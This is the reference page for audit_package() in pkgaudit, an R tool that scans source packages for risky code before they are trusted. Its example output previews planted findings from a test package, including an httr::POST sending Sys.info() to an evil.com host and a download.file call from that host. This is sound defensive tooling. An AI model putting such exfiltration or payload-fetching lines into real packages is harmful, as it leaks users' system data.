# Audit an R source package

Finds security-relevant file and code contexts, code patterns, and shell
and make matches for review before an R source package is trusted.

## Usage

``` r
audit_package(path = ".", rules = load_rules(), .origin = NULL)
```

## Arguments

- path:

  Path to an R source package root directory. Defaults to the current
  directory.

- rules:

  Named list of rules. Defaults to the rules bundled with the package as
  returned by
  [`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md).

- .origin:

  Internal. Used by
  [`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
  to record tarball provenance: a list of `path` and `sha256`, each a
  length-one character, and `is_tarball`, a length-one logical that is
  not `NA`. A malformed one is refused before the scan rather than
  silently recorded. `NULL` for a directory scan, which is hashed with
  [`hash_manifest()`](https://tylerjssmith.github.io/pkgaudit/reference/hash_manifest.md)
  instead.

## Value

A
[`new_pkgaudit()`](https://tylerjssmith.github.io/pkgaudit/reference/new_pkgaudit.md)
object: a named list with class `pkgaudit` holding five data frames and
a `metadata` list. Every findings frame carries the nine phase columns
described under Lifecycle phases and joins to the others on
`file_context`. Paths are relative to the package root.

- file_contexts:

  `rule`, `file_context`, `message`.

- patterns:

  `rule`, `file_context`, `line_number`, `column_number`,
  `code_context`, `guarded`, `indirect`, `preview`, `message`, `attck`.
  `code_context` is where the code sits within its file: `top_level`,
  `in_function`, an enclosing lifecycle hook, or the part of a help file
  it came from.

- matches:

  `rule`, `file_context`, `line_number`, `column_number`, `preview`,
  `message`, `attck`: regular-expression matches in the shell and
  Make-like file contexts. Text matching has no parse tree behind it, so
  the three columns `patterns` derives from one – `code_context`,
  `guarded` and `indirect` – are absent rather than empty.

- coverage:

  `file_context`, `language`, `status`, `reason`, `first_line`,
  `last_line`, `lines`, `bytes`, `rule`. One row per file the package
  carries that is, or could be, code, plus one per span of an unanalyzed
  language inside a literate file – a `python` chunk in a vignette is
  its own row.

- errors:

  `step`, `file_context`, `rule`, `message`. Recoverable failures,
  collected rather than aborting the scan.

- metadata:

  `pkg_name`, `pkg_version`, `pkg_path`, `pkg_is_tarball`, `pkg_sha256`,
  `pkgaudit_version`, `pkgaudit_rules_version`, `pkgaudit_rules_sha256`,
  `scanned`. The two rules fields are `NA` for a rules list that did not
  come from
  [`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md).

## Details

A file-context rule decides which files are read and how. Only some
rules report the files they match as findings in their own right; the
rest exist to point the scan at code. A file in a language pkgaudit
cannot read is left unscanned rather than scanned badly, so a file's
absence from `patterns` and `matches` is not evidence that it is clean –
`coverage` is where that question is answered.

## Coverage

`coverage` accounts for the code a package carries, so a clean scan can
be checked rather than trusted. `status` is one of `parsed` (read as R),
`matched` (scanned as text), `exportable` (a language pkgaudit does not
read, which
[`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
can hand to a tool that does), `unexamined` (never read), or `error`
(read attempted and refused); `reason` says what stood in the way.
`unexamined` and `error` are different claims: pkgaudit never tried to
read the first and could not read the second.

`reason` is `NA` where nothing stood in the way, and otherwise one of:
`no_analyzer` (pkgaudit does not read that language), `no_extractor` (a
rule claimed the file but nothing reads that kind of file, as for
`DESCRIPTION`), `no_rule` (no rule looks where it sits), `serialized`,
`binary`, `symlink`, `too_large` (over the 10 MB scanning limit),
`unreadable`, or `unparseable`.

A file earns a row when a rule claimed it, or when its name says what
kind of file it is, wherever it sits. Files are identified by name and
never by content, so a script with no extension – `tools/build` opening
`#!/bin/sh` – is missed. Coverage never reaches 100% and is not meant
to; what it offers is legibility rather than completeness. Deserializing
an `.rda` can execute arbitrary code, so serialized objects are reported
as executable surface rather than as data. Version-control and IDE state
is excluded, and `.Rbuildignore` is not consulted, since the package
under audit writes it.

## Lifecycle phases

Every findings frame carries one logical column per phase –
`at_autoconf`, `at_build`, `at_check`, `at_install_src`,
`at_install_bin`, `at_load`, `at_attach`, `at_unload` and `at_detach` –
`TRUE` when that finding's code runs then. A finding can belong to
several, so the columns do not partition the rows.

A file context, and a match found in one, take the phases of the rule
that matched. A pattern takes them from where its file sits and where
the code sits within it: a lifecycle hook or a part of a help file
carries phases of its own, and otherwise the code inherits the phases
around it, so the same call reports `at_check` under `tests/` and
`at_build` under `data/`. Code inside a function definition inherits
too, except where a rule sets `assume_called = FALSE`, as the rules for
`R/` do. See
[`vignette("rules")`](https://tylerjssmith.github.io/pkgaudit/articles/rules.md).

## Reading a finding

`preview` is a display-only excerpt of the line, whitespace collapsed,
so the frames can be skimmed without opening files. A long line is
windowed on the match, so `column_number` does not index into it.

`guarded` is `TRUE` for code that ships but the lifecycle does not run –
a `\dontrun{}` block, or a vignette chunk suppressed by either
`eval=FALSE` in its header or `#| eval: false` beneath it. Its phases
still come from its context and remain an upper bound. A document-wide
`execute: eval: false` in Quarto front matter is not read, so a chunk it
suppresses still reports. `indirect` is `TRUE` where the call was made
through the function's name, as in `do.call("system", ...)`, and is
reported under the rule that owns the name; see
[`find_indirect()`](https://tylerjssmith.github.io/pkgaudit/reference/find_indirect.md).

Patterns are matched against R's parse tree, matches against text. Text
matching has no syntax behind it, so a match inside a comment or a
quoted string cannot be told from one in a live command; see
[`find_matches()`](https://tylerjssmith.github.io/pkgaudit/reference/find_matches.md).

A file over 10 MB is not read at all: a hostile package must not be able
to spend the scanner's memory. It still earns a `coverage` row, with
`reason` `too_large`, so the skip is reported rather than silent.

## Examples

``` r
# untrustedpkg is a small package shipped with pkgaudit to be scanned.
tarball <- system.file(
  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
  package = "pkgaudit"
)
exdir <- file.path(tempdir(), "untrustedpkg-example")
utils::untar(tarball, exdir = exdir)

rules  <- load_rules()
result <- audit_package(file.path(exdir, "untrustedpkg"), rules = rules)
result$file_contexts
#>        rule file_context
#> 3 configure    configure
#>                                                                                                                                                                                                                                                  message
#> 3 configure is a shell script used for system-dependent configuration when a package is installed from source, including the installs performed by R CMD check and by R CMD build when a package has vignettes. It can execute arbitrary shell commands.
#>   at_autoconf at_build at_check at_install_src at_install_bin at_load at_attach
#> 3       FALSE     TRUE     TRUE           TRUE          FALSE   FALSE     FALSE
#>   at_unload at_detach
#> 3     FALSE     FALSE
result$patterns
#>            rule      file_context line_number column_number     code_context
#> 1 download_file         R/fetch.R           2             3      in_function
#> 2        system           R/zzz.R           2             3      onLoad_base
#> 3 download_file man/fetch_data.Rd          11             1      Rd_examples
#> 4          httr man/fetch_data.Rd           6            30 Rd_Sexpr_install
#>   guarded indirect
#> 1   FALSE    FALSE
#> 2   FALSE    FALSE
#> 3   FALSE    FALSE
#> 4   FALSE    FALSE
#>                                                                       preview
#> 1                                              download.file(url, tempfile())
#> 2                                                          system("uname -a")
#> 3                  download.file("https://www.evil.com/data.csv", tempfile())
#> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
#>                                                                                                                                                                message
#> 1 download.file() and url() retrieve or open a connection to a remote resource. This can stage a payload for execution via source() or system() in a two-stage attack.
#> 2                                                                              system(), system2(), shell() (on Windows), and pipe() execute arbitrary shell commands.
#> 3 download.file() and url() retrieve or open a connection to a remote resource. This can stage a payload for execution via source() or system() in a two-stage attack.
#> 4                            An httr HTTP call sends an outbound request. A request may be used to exfiltrate credentials or other data, or to fetch a remote payload.
#>                 attck at_autoconf at_build at_check at_install_src
#> 1               T1105       FALSE    FALSE    FALSE          FALSE
#> 2 T1059.003 T1059.004       FALSE     TRUE     TRUE           TRUE
#> 3               T1105       FALSE    FALSE     TRUE          FALSE
#> 4               T1041       FALSE     TRUE     TRUE           TRUE
#>   at_install_bin at_load at_attach at_unload at_detach
#> 1          FALSE   FALSE     FALSE     FALSE     FALSE
#> 2          FALSE    TRUE     FALSE     FALSE     FALSE
#> 3          FALSE   FALSE     FALSE     FALSE     FALSE
#> 4          FALSE   FALSE     FALSE     FALSE     FALSE
print(result)
#> --- pkgaudit ----------------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> Path:      /tmp/RtmpttDUVh/untrustedpkg-example/untrustedpkg
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-21 22:12 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> File contexts:  1
#> Patterns:       4
#> Matches:        1
#> Errors:         0
```
